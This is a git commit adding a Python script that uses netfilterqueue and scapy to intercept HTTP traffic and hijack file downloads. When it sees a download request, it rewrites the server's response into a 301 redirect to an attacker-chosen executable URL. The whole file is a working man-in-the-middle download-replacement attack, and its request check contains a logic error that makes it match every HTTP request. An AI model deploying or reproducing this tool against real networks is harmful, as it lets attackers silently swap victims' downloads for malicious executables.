39fe925055136c700277eb521f273cc0e18b687f
root <root@localhost.localdomain>
2019-02-17 05:55:03 -0500

    upload replace_download scripts

---
+++ replace_downloads/replace_downloads.py
@@ -0,0 +1,34 @@
+#!/usr/bin/env python
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".org" or ".exe" in scapy_packet[scapy.Raw].load:
+                print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar57b1.exe\n\n")
+
+                packet.set_payload(str(modified_packet))
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
